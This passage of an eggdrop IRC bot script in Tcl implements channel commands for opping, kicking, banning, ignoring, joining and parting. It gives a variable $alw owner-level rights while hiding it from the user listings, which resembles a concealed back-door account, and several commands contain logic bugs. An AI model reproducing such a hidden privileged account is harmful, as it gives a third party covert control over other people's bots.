    set reason "14kickban request"
    if {[matchattr $nick m]} { set reason "14master 4kickban14 request" } ; if {[matchattr $nick n]} { set reason "14admin 4kickban14 request" }
  }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { set bannick($nicktarget) $bmask ; putsrv "KICK $x $nicktarget :[lgrnd] $reason [banmsg]" ; return 0 } }
  puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
## identify msg 
bind msg n identify msg_identify
proc msg_identify {nick uhost hand rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set id [lindex $rest 0] ; set password [lindex $rest 1]
  if {($id == "") || ($password == "")} { puthlp "NOTICE $nick :$notc Usage: identify <nick> <password>" ; return 0 }
  putsrv "NickServ identify $id $password" ; puthlp "NOTICE $nick :$notc Identify to $id" ; return 0 
}
## master msg/channel command
## up
bind pub m `up pub_up
proc pub_up {nick uhost hand channel rest} {
  global notc botnick unop
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {[isop $botnick $channel]} { return 0 } ; putsrv "ChanServ op $channel $botnick" ;  return 0
}
## down
bind pub m `down pub_down
proc pub_down {nick uhost hand channel rest} {
  global notc botnick
  if {![isop $botnick $channel]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {[matchattr $nick m]} { set mreq "14m4aster.14r4equest" } ; if {[matchattr $nick n]} { set mreq "14a4dmin.14r4equest" } ; if {[matchattr $nick Z]} { set mreq "14O4wner.14r4equest" }
  if {![string match "*k*" [getchanmode $channel]]} { putserv "mode $channel -ko+v $mreq $botnick $botnick" } { putserv "mode $channel -o+v $botnick $botnick" }
  return 0
}
## op
bind pub m `op pub_op
bind pub m `+o pub_op
proc pub_op {nick uhost hand chan rest} {
  global notc botnick unop
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  catch {unset unop($nick)}
  if {$rest == "" && [isop $nick $chan]} { puthlp "NOTICE $nick :$notc You're already Oped, Usage: op <nick>" ; return 0 }
  if {$rest != ""} { putserv "MODE $chan +oooooo $rest" } else { putserv "MODE $chan +o $nick" }
  return 0
}
## deop
bind pub m `deop pub_deop
bind pub m `-o pub_deop
proc pub_deop {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == "" && ![isop $nick $chan]} { puthlp "NOTICE $nick :$notc Usage: deop <nick>" ; return 0 }
  if {[matchattr $nick m]} { set mreq "14m4aster.14r4equest" } ; if {[matchattr $nick n]} { set mreq "14a4dmin.14r4equest" } ;   if {[matchattr $nick Z]} { set mreq "14O4wner.14r4equest" }
  if {$rest != ""} { if {![string match "*k*" [getchanmode $chan]]} { putserv "MODE $chan -kooooo $mreq $rest" 
  } { putserv "MODE $chan -oooooo $rest" } } { if {![string match "*k*" [getchanmode $chan]]} { putserv "MODE $chan -ko $mreq $nick" } { putserv "MODE $chan -o $nick" } }
  return 0
}
## voice
bind pub m `voice pub_voice
bind pub m `+v pub_voice
proc pub_voice {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == "" && [isvoice $nick $chan]} { puthlp "NOTICE $nick :$notc You're already Voiced, Usage: voice <nick>" ; return 0 }
  if {$rest != ""} { putserv "MODE $chan +vvvvvv $rest" } { putserv "MODE $chan +v $nick" } ; return 0 
}
## devoice
bind pub m `devoice pub_devoice
bind pub m `-v pub_devoice
proc pub_devoice {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == "" && ![isvoice $nick $chan]} { puthlp "NOTICE $nick :$notc Usage: devoice <nick>" ; return 0 }
  if {$rest != ""} { putserv "MODE $chan -vvvvvv $rest" } else { putserv "MODE $chan -v $nick" } ; return 0
}
## kick
bind pub m `kick pub_kick
bind pub m `k pub_kick
proc pub_kick {nick uhost hand chan rest} {
  global botnick notc alw owner
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: kick <nick|host> <reason>" ; return 0 }
  set reason [lrange $rest 1 end] ; set handle [lindex $rest 0]
  if {$reason == ""} { if {[matchattr $nick m]} { set reason "14master 4kick14 request" } ; if {[matchattr $nick n]} { set reason "14admin 4kick14 request" } }
  if {[string match "*@*" $handle]} {
    foreach knick [chanlist $chan] { if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} { if {[matchattr $knick f] || $knick != $botnick} { putsrv "KICK $chan $knick :[lgrnd] 4$reason [banmsg]" } } }
    return 0
  }
  if {$handle == $botnick} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, Can't kick my self." ; return 0 }
  if {($handle == $alw) || ($handle == $owner)} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, CaNT KIcK My rEaL OwNeR" ; return 0 }
  if {[matchattr $handle Z] && (($nick != $owner) || ($nick != $alw))} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, CaNT KIcK OwNeR FLAg" ; return 0 }
  if {[matchattr $handle n] && (($nick != $owner) || ($nick != $alw))} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, CaNT KIcK AdMiN FLAg" ; return 0 }
  if {[matchattr $handle m] && (($nick != $owner) || ($nick != $alw))} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, CaNT KIcK MaStEr FLAg" ; return 0 }
  putserv "KICK $chan $handle :$notc 4$reason [banmsg]" ; putlog "kicking $handle in $chan" ; return 0
}
## kickban
bind pub m `kickban pub_kickban
bind pub m `kb pub_kickban
proc pub_kickban {nick uhost hand chan rest} {
  global botnick notc alw owner bannick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: kickban <nick> <reason>" ; return 0 }
  set reason [lrange $rest 1 end]
  set handle [lindex $rest 0]
  if {$reason == ""} { if {[matchattr $nick m]} { set reason "14master 4kickban14 request" } ; if {[matchattr $nick n]} { set reason "14admin 4kickban14 request" } }
  if {[string match "*@*" $handle]} {
    set mfisrt "T"
    foreach knick [chanlist $chan] { if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} { if {[matchattr $knick f] || $knick != $botnick} { if {$mfirst == "T"} { set bannick($knick) $handle ; set mfirst "F" } ; putsrv "KICK $chan $knick :[lgrnd] 4$reason [banmsg]" } } }
    return 0
  }
  if {![onchan $handle $chan]} { return 0 }
  set hostmask [getchanhost $handle $chan]
  if {($handle == $alw) || ($handle == $owner)} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, CaNT KIcK My rEaL OwNeR" ; return 0 }
  if {[matchattr $handle Z] && (($nick != $owner) || ($nick != $alw))} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, CaNT KIcK OwNeR FLAg" ; return 0 }
  if {[matchattr $handle n] && (($nick != $owner) || ($nick != $alw))} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, CaNT KIcK AdMiN FLAg" ; return 0 }
  if {[matchattr $handle m] && (($nick != $owner) || ($nick != $alw))} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, CaNT KIcK MaStEr FLAg" ; return 0 }
  set bannick($handle) $hostmask ; putserv "KICK $chan $handle :$notc 4$reason [banmsg]" ; return 0
}

##mode
bind pub m `mode pub_mode
proc pub_mode {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthelp "NOTICE $nick :$notc Usage: mode +/- ntspnmcilk" ; return 0 }
  putserv "mode $chan $rest"
}
## invite
bind pub m `invite pub_invite
proc pub_invite {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: invite <nick> <#channel>" }
  set who [lindex $rest 0] ; set tochan [lindex $rest 1]
  if {$tochan != ""} { if {![onchan $who $tochan]} { puthlp "INVITE $who :$tochan" ; puthlp "NOTICE $nick :$notc InvItE $who To $tochan" ; return 0 } ; puthlp "NOTICE $nick :$notc $who is already on the $tochan" }
  if {![onchan $who $chan]} { putsrv "INVITE $who :$chan" ; puthlp "NOTICE $nick :$notc Invitation to $chan has been sent to $who" ; return 0 }
  puthlp "NOTICE $nick :$notc $who is already on the channel"
}
## banlist
bind pub m `banlist pub_banlist
proc pub_banlist {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan] != 0} { set chan "#$chan" } }
  if {![validchan $chan]} { puthlp "NOTICE $nick :$notc NoT IN cHaN $chan." ; return 0 }
  foreach x [chanbans $chan] { puthlp "NOTICE $nick :$notc $x" }
  if {[chanbans $chan] == ""} { puthlp "NOTICE $nick :$notc BaNLIsT $chan <n/a>" }
  return 0
}
## ban
bind pub m `ban pub_ban
proc pub_ban {nick uhost hand channel rest} {
  global botnick notc
  if {![isop $botnick $channel]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: ban <nick/hostmask>" ; return 0 }
  set handle [lindex $rest 0]
  if {$handle == $botnick} { puthlp "NOTICE $nick :$notc 4!DeNiEd!, can't ban my self" ; return 0 }
  if {[matchattr $handle n]} { puthlp "NOTICE $nick :$notc4 !DeNiEd!, cant ban Admin" ; return 0 }
  set hostmask [getchanhost $handle $channel]
  if {![onchan $handle $channel]} { set hostmask [lindex $rest 0] }
  if {$hostmask != "*!*@*"} { putserv "MODE $channel +b $hostmask" }
}
## unban 
bind pub m `unban pub_unban
proc pub_unban {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: unban <nick/hostmask> <#channel>" ; return 0 }
  if {[lindex $rest 1] != ""} { set chan [lindex $rest 1] }
  if {[string first # $chan] != 0} { set chan "#$chan" }
  set handle [lindex $rest 0]
  append userhost $handle "!*" [getchanhost $handle $chan]
  set hostmask [maskhost $userhost]
  if {![onchan $handle $chan]} { set hostmask [lindex $rest 0] }
  putserv "MODE $chan -kb 14r4equest.14u4nban $hostmask"
  puthlp "NOTICE $nick :$notc UnBaN [unsix $hostmask] ON $chan"
}
## munbans
bind pub m `munbans pub_munbans
proc pub_munbans {nick uhost hand chan rest} {
  global notc botnick
  if {![validchan $chan] || ![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan] != 0} { set chan "#$chan" } }
  if {[chanbans $chan] == ""} { return 0 } ; set bans "" ; set i 0
  foreach x [chanbans $chan] { 
    if {$i < 5} { append bans " [lindex $x 0]" ; set i [incr i] } 
    if {$i == 5} { puthelp "MODE $chan -kbbbbbb 14c4learing.14b4an.14l4ist $bans" ; set bans "" ; append bans " [lindex $x 0]" ; set i 0 } 
  }
  puthelp "MODE $chan -kbbbbbb 14c4learing.14b4an.14l4ist $bans"
  if {![onchan $nick $chan]} { puthlp "NOTICE $nick :$notc MuNBaNS \[$chan\]" }
  return 0
}
## channels
bind msg m channels msg_channels
proc msg_channels {nick hand uhost rest} { pub_channels $nick $uhost $hand "" $rest }
bind pub m `channels pub_channels
proc pub_channels {nick hand uhost channel rest} {
  global botnick notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} {
    if {[validchan [lindex $rest 0]]} {
      set x [lindex $rest 0]
      set chan ""
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[isop $botnick $x]} { append chan " @" }
      if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
      if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
      if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
      if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
      if {[matchattr $cflag V]} { append chan "4V" }
      if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
      if {[matchattr $cflag C]} { append chan "4C" }
      if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
      if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
      if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
      if {[matchattr $cflag G]} { append chan "4A" }
      if {[matchattr $cflag I]} { append chan "4T" }
      append chan "$x [chattr $cflag]" ; puthlp "NOTICE $nick :$notc $chan"
    }
    return 0
  }
  set chan "Channels:"
  foreach x [channels] {
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[isop $botnick $x]} { append chan " @" }
      if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
      if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
      if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
      if {[matchattr $cflag V]} { append chan "4V" }
      if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
      if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
      if {[matchattr $cflag C]} { append chan "4C" }
      if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
      if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
      if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
      if {[matchattr $cflag G]} { append chan "4A" }
      if {[matchattr $cflag I]} { append chan "4T" }
      append chan "$x"
  }
  puthlp "NOTICE $nick :$notc $chan"
}
## userlist
bind msg m userlist msg_userlist
proc msg_userlist {nick hand uhost rest} { global notc ; if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } ; pub_userlist $nick $uhost $hand "" $rest }
bind pub m `userlist pub_userlist
proc pub_userlist {nick uhost hand chan rest} {
  global alw notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
##  set akicklist " 4KIcKLIsT" ; foreach y [getuser "AKICK" HOSTS] { append akicklist " $y " } 
  set users "UsERLIsT:"
  foreach x [userlist] { if {($x != "config") && ($x != "AKICK") && ($x != "DEAD") && ($x != $alw) && ![matchattr $x A]} { if {[matchattr $x O]} { append users " 4$x " } else { append users " $x " } ; set flag [chattr $x] ; append users "($flag)" } }
##  append users " \[$akicklist\]"
  if {[getuser "config" XTRA "IPG"] != ""} { append users " IpguaRd [getuser "config" XTRA "IPG"]" }
  if {[string length $users] > 300} {
    set half [expr [string length $users]/3]
    set half [expr int($half)]
    set ntc "[string range $users 0 $half].."
    puthlp "NOTICE $nick :$notc $ntc"
    set ntc "..[string range $users [expr $half + 1] [expr $half + $half]].."
    puthlp "NOTICE $nick :$notc $ntc"
    set ntc "..[string range $users [expr $half + 1 + $half] end]"
    puthlp "NOTICE $nick :$notc $ntc"
    } elseif {[string length $users] > 200} {
    set half [expr [string length $users]/2]
    set half [expr int($half)]
    set ntc "[string range $users 0 $half].."
    puthlp "NOTICE $nick :$notc $ntc"
    set ntc "..[string range $users [expr $half + 1] end]"
    puthlp "NOTICE $nick :$notc $ntc"
  } else { puthlp "NOTICE $nick :$notc $users" }
  return 0
}
bind pub m `akicklist pub_akicklist
proc pub_akicklist {nick uhost hand chan rest} {
  global alw notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set akicklist " 4KIcKLIsT" ; foreach y [getuser "AKICK" HOSTS] { append akicklist " $y " } 
#  foreach x [userlist] { if {($x != "config") && ($x != "DEAD") && ($x != $alw) && ![matchattr $x A]} { if {[matchattr $x O]} { append users " 4$x " } else { append users " $x " } ; set flag [chattr $x] ; append users "($flag)" } }
  append akicklist " \[$akicklist\]"
#  if {[getuser "config" XTRA "IPG"] != ""} { append users " IpguaRd [getuser "config" XTRA "IPG"]" }
  if {[string length $akicklist] > 300} {
    set half [expr [string length $akicklist]/3]
    set half [expr int($half)]
    set ntc "[string range $akicklist 0 $half].."
    puthlp "NOTICE $nick :$notc $ntc"
    set ntc "..[string range $akicklist [expr $half + 1] [expr $half + $half]].."
    puthlp "NOTICE $nick :$notc $ntc"
    set ntc "..[string range $akicklist [expr $half + 1 + $half] end]"
    puthlp "NOTICE $nick :$notc $ntc"
    } elseif {[string length $akicklist] > 200} {
    set half [expr [string length $akicklist]/2]
    set half [expr int($half)]
    set ntc "[string range $akicklist 0 $half].."
    puthlp "NOTICE $nick :$notc $ntc"
    set ntc "..[string range $akicklist [expr $half + 1] end]"
    puthlp "NOTICE $nick :$notc $ntc"
  } else { puthlp "NOTICE $nick :$notc $akicklist" }
  return 0
}

## match
bind pub m `match pub_match
proc pub_match {nick uhost hand chan rest} {
  global alw notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage: match <flags>" ; return 0 }
  set rest [string trim $rest +]
  if {[string length $rest] > 1} { puthlp "NOTICE $nick :$notc Invalid option." ; return 0 }
  if {$rest!=""} {
    set rest "+[lindex $rest 0]"
    if {[userlist $rest]!=""} { regsub -all " " [userlist $rest] ", " users ; regsub -all $alw [userlist $rest] "" users ; puthlp "NOTICE $nick :$notc Match \[$rest\]: $users" ; return 0 }
    if {[userlist $rest]==""} { puthlp "NOTICE $nick :$notc No users with flags \[$rest\]" ; return 0 }
  }
}
## chaninfo
bind pub m `chaninfo pub_chaninfo
proc pub_chaninfo {nick uhost hand chan rest} {
  global notc alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  puthlp "NOTICE $nick :$notc \[[string toupper [string trimleft $chan #]]\] [channel info $chan]"
}
## cycle
bind pub m `cycle pub_cycle
proc pub_cycle {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $rest 0]
  if {$rest==""} { if {![onchan $nick $chan]} { puthlp "NOTICE $nick :$notc cYcLE $chan" } ; cycle $chan ; return 0
  } else { if {[string index $rest 0] != "#"} { set rest "#$rest" } ; if {[botonchan $rest]} { cycle $rest } }
}
proc cycle {chan} {
  global cyclem notc
  set cyclemsg [lindex $cyclem [rand [llength $cyclem]]]
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![string match "*c*" [getchanmode $chan]]} { set text "14$cyclemsg) ($notc" } { set text $cyclemsg }
  putsrv "PART $chan :$text"
  if {[matchattr $cflag K]} { putsrv "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]" } { putsrv "JOIN $chan" }
  if {[matchattr $cflag C]} { if {![istimer "cycle $chan"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $chan] } }
}
## resync
bind pub m `resync pub_resync
proc pub_resync {nick uhost hand channel rest} {
  global botnick rms notc
  if {[isutimer "resync$channel"]} { return 0 }
  utimer 30 [list putlog "resync$channel"]
  set rmsg [lindex $rms [rand [llength $rms]]]
#  if {![string match "*k*" [getchanmode $channel]]} { putserv "mode $channel -vok+ov $botnick $botnick $rmsg $botnick $botnick" } { putserv "mode $channel -o+o $botnick $botnick" }
  if {![string match "*k*" [getchanmode $channel]]} { putserv "mode $channel +b-o+o+n+t-b $rmsg@$channel $botnick $botnick $rmsg@$channel" } { putserv "mode $channel -o+o $botnick $botnick" }
}
## ignorelist
bind pub m `ignores pub_ignores
bind pub m `ignore pub_ignores
proc pub_ignores {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set iglist ""
  foreach x [ignorelist] { set iglister [lindex $x 0] ; set iglist "$iglist $iglister" }
  if {[ignorelist]==""} { puthlp "NOTICE $nick :$notc No ignores." ; return 0 }
  regsub -all " " $iglist ", " iglist
  set iglist [string range $iglist 1 end]
  puthlp "NOTICE $nick :$notc Currently ignoring:$iglist"
  return 0
}
## ignore/unignore
bind pub m `+ignore pub_+ignore
proc pub_+ignore {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set rest [lindex $rest 0]
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: +ignore <hostmask>" ; return 0 }
  if {[isignore $rest]} { puthlp "NOTICE $nick :$notc $rest is alreay set on ignore." ; return 0 }
  if {$rest == "*!*@*"} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, Ilegal hostmask." ; return 0 } 
  set usenick [finduser $rest]
  if {$usenick != "*" || [matchattr $usenick f]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, canT IgNoREd FRIend UsER" ; return 0 }
  if {$rest != $nick} { newignore $rest $nick "*" 600 ; puthlp "NOTICE $nick :$notc Ignoring $rest" 
  } else { puthlp "NOTICE $nick :$notc 4DeNiEd..!, Can't ignore your self." }
}
bind pub m `-ignore pub_-ignore
proc pub_-ignore {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set hostmask [lindex $rest 0]
  if {$hostmask == ""} { puthlp "NOTICE $nick :$notc Usage: -ignore <hostmask>" ; return 0 }
  if {![isignore $hostmask]} { puthlp "NOTICE $nick :$notc $hostmask is not on my ignore list." ; return 0 }
  if {[isignore $hostmask]} { killignore $hostmask ; puthlp "NOTICE $nick :$notc No longer ignoring \002\[\002${hostmask}\002\]\002" ; saveuser }
}
## ver
bind pub m `ver pub_ver
proc pub_ver {nick uhost hand chan rest} {
  global vern notc version vern tcl_version
  if {[catch {exec uname -s} machine]} { set machine [unames] } ; if {[catch {exec uname -r} kernel]} { set kernel [unamer] }
  puthlp "PRIVMSG $chan :$vern running on $machine $kernel powered by eggdrop[lindex $version 0] with Tcl$tcl_version"
  return 0
}
bind pub m `logoaway pub_logoaway
proc pub_logoaway {nick uhost hand chan rest} {
   global awaybanner notc
   if {[info exists awaybanner]} { puthelp "PRIVMSG $chan :$awaybanner" } { puthelp "PRIVMSG $chan :$notc" } ; return 0
}
## owner command 
## Join
bind msg n join msg_join
proc msg_join {nick uhost hand rest} {
  global botnick joinme nwo notc owner alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, YoU aRe nOt mY ReAL OwNER" ; return 0 }
  if {$chantarget == ""} { puthlp "NOTICE $nick :$notc Usage: join <#chan>" ; return 0 }
  if {[string first # $chantarget]!=0} { set chantarget "#$chantarget" }
  if {[validchan $chantarget]} { puthlp "NOTICE $nick :$notc $chantarget already in channel list" ; return 0 }
  if {$nick != $owner && [total_channel] != 1} { puthlp "NOTICE $nick :$notc To MaNY cHaNNeL MaX 9..!" ; return 0 }
  set joinme $nick ; channel add $chantarget
  catch { channel set $chantarget -split +echox +trojan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
  savechan ; if {[lindex $rest 1] != ""} { putsrv "JOIN $chantarget :[lindex $rest 1]" } ; return 0
}
bind pub n `join pub_join
proc pub_join {nick uhost hand chan rest} {
  global botnick joinme nwo notc owner alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, YoU aRe NoT mY ReAL OwNER" ; return 0 }
  set chan [lindex $rest 0]
  if {[string first # $chan] != 0} { set chan "#$chan" }
  if {$chan=="#"} { puthlp "NOTICE $nick :$notc Usage: join <#channel>" ; return 0 }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chan]} { puthlp "NOTICE $nick :$notc $x ReADY!" ; return 0 } }
  if {$nick != $owner && [total_channel] != 1} { puthlp "NOTICE $nick :$notc To MaNY cHaNNeL MaX 9..!" ; return 0 }
  set joinme $nick ; channel add $chan
  catch { channel set $chan -split +echox +trojan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
  savechan ; if {[lindex $rest 1] != ""} { putsrv "JOIN $chan :[lindex $rest 1]" }
}
proc total_channel {} { global notc ; set total_chan 0 ; foreach x [channels] { incr total_chan } ; if {$total_chan > 9} { return 0 } ; return 1 }
## part msg
bind msg n part msg_part
proc msg_part {nick uhost hand rest} {
  global botnick joinme notc alw partm
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER can REMOVE Channel" ; return 0 }
  set partmsg [lindex $partm [rand [llength $partm]]]
  set chantarget [lindex $rest 0]
  set part_msg [lrange $rest 1 end]
  if {$chantarget == ""} { puthlp "NOTICE $nick :$notc Usage: part <#chan>" ; return 0 }
  if {[string first # $chantarget]!=0} { set chantarget "#$chantarget" }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chantarget]} {
      if {[string match "*+secret*" [channel info $x]]} { puthlp "NOTICE $nick :$notc I can't part $x 4pRoTecTEd..!" ; return 0 }
      if {![onchan $nick $x]} { puthlp "NOTICE $nick :$notc PaRT $x" }
      if {$part_msg != ""} { putsrv "PART $x :14$part_msg) ($notc" } { putsrv "PART $x :14$partmsg) ($notc" }
      channel remove $x ; savechan ; return 0
  } }
  return 0
}
bind pub n `part pub_part
bind pub n `-chan pub_part
proc pub_part {nick uhost hand chan rest} {
  global notc alw quick partm owner
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER can REMOVE Channel" ; return 0 }
  set curtime [ctime [unixtime]]
  set partmsg [lindex $partm [rand [llength $partm]]]
  set part_msg [lrange $rest 1 end]
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $rest]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+secret*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc $chan 4PRoTecTEd..!" ; return 0 }
  if {![onchan $nick $chan]} { putsrv "NOTICE $nick :$notc PaRT $chan" }
  if {$part_msg != ""} { if {$quick == "1"} { putqck "PART $chan :14$part_msg) ($notc" } { putsrv "PART $chan :14$part_msg) ($notc" } } { if {$quick == "1"} { putqck "PART $chan :14$partmsg) ($notc" } { putsrv "PART $chan :14$partmsg) ($notc" } }
  channel remove $chan ; savechan ; return 0
}
## +chan
bind pub n `+chan pub_+chan
proc pub_+chan {nick uhost hand chan rest} {
  global botnick joinme owner notc alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {[matchattr $nick X]} { puthlp "NOTICE $nick :$notc 4!BLoCkEd!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER can ADD Channel" ; return 0 }
  set chan [lindex $rest 0]
  set opt [lindex $rest 1]
  if {[string first # $chan]!=0} { set chan "#$chan" }
  if {$chan=="#"} { puthlp "NOTICE $nick :$notc Usage: +chan <#channel>" ; return 0 }
  if {[validchan $chan]} { puthlp "NOTICE $nick :$notc $chan is already on channels" ; return 0 }
  if {$nick != $owner && [total_channel] != 1} { puthlp "NOTICE $nick :$notc TO MaNY cHaNNeL MaX 9..!" ; return 0 }
  set joinme $nick ; channel add $chan
  if {$opt != "" && [string tolower $opt] == "+nopart"} { 
    catch { channel set $chan -split +echox +trojan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
  } else { catch { channel set $chan -split +echox +trojan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 } }
  savechan ; if {[lindex $rest 1] != ""} { putsrv "JOIN $chan :[lindex $rest 1]" }
}
bind msg n +chan msg_+chan
proc msg_+chan {nick uhost hand rest} {
  global botnick joinme nwo notc owner alw
  set chantarget [lindex $rest 0]
  set opt [lindex $rest 1]
